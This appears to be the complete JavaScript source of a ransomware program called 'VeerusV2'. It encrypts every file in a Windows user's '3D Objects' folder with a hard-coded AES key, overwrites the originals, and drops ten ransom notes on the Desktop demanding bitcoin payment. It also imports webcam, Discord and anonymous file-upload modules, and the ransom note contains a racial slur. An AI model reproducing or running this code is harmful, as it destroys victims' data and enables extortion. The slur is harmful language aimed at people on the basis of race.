const email = "" //ton email
var adresseBTC = "" 
var amnt = "50" // montant
const urss = require("os").userInfo().username;

var zipper = require('zip-local');
const { upload, getInfo, download } = require("node-annonfiles");
const open = require('open');
const gpuInfo = require('gpu-info');
const http = require('https');
const fs = require('fs');
const crypto = require('crypto');
const copyp = require("copy-paste")
const recursive = require("recursive-readdir");
const { exec } = require("child_process");
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder , Events, ModalBuilder, TextInputBuilder, TextInputStyle} = require('discord.js');
var request = require('request');
const client = new Client({ intents: [GatewayIntentBits.Guilds] });
const NodeWebcam = require( "node-webcam" );

function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}




var ENC= 'dsazdazd41456d1za516d15za15daz15'; //Key for the Ransomware (must be 32 characters)
var IV = "54d45az456d15ad1"; // IV For the Ransomware (must be 16 characters)
const ALGO = "aes-256-cbc" // Hashing Algorithm

const encrypt = ((text) => 
{
   let cipher = crypto.createCipheriv(ALGO, ENC, IV);
   let encrypted = cipher.update(text, 'utf8', 'base64');
   encrypted += cipher.final('base64');
   return encrypted;
});
const decrypt = ((text) => 
{
   let decipher = crypto.createDecipheriv(ALGO, ENC, IV);
   let decrypted = decipher.update(text, 'base64', 'utf8');
   return (decrypted + decipher.final('utf8'));
});


function rnsm(email, btcAdress, amount){
  // Sry for the hard coding :'(
  var counter = 0;

  recursive(`C:/Users/${urss}/3D Objects/`, function (err, files) {
    
    try{
    for(i = 0; i<=files.length; i++){
      try{
                if(files[i].includes(".ini")){
            continue
          }
        var contents = fs.readFileSync(files[i], 'utf8');
        var encrypted_key = encrypt(contents)
        console.log(encrypted_key)
        fs.truncate(files[i], 0, function(){console.log('done')})
        fs.writeFile(files[i], encrypted_key, function (err) {
          if (err) return console.log(err);
          console.log(files[i]);
        });

      }catch(e){
        console.log(e)
        continue
      }

    }}catch(e){
      console.log(e)
    return
  }
  });
  for(var i=0; i<=10; i++){
      fs.writeFileSync(`C:/Users/${urss}/Desktop/${makeid(10)}.txt`, "Hello, you just got ransomware'ed by VeerusV2 (made by YZD/SxZ so please follow on github my nigga), just send the amunt in bitcoin, contact us by email, you will get the antidote." + `\nAmount :  ${amount}$ (USD)\nEmail : ${email}\nAddresse Bitcoin : ${btcAdress}\n` );
  }



}

rnsm(emaill, adresseBTC, amnt)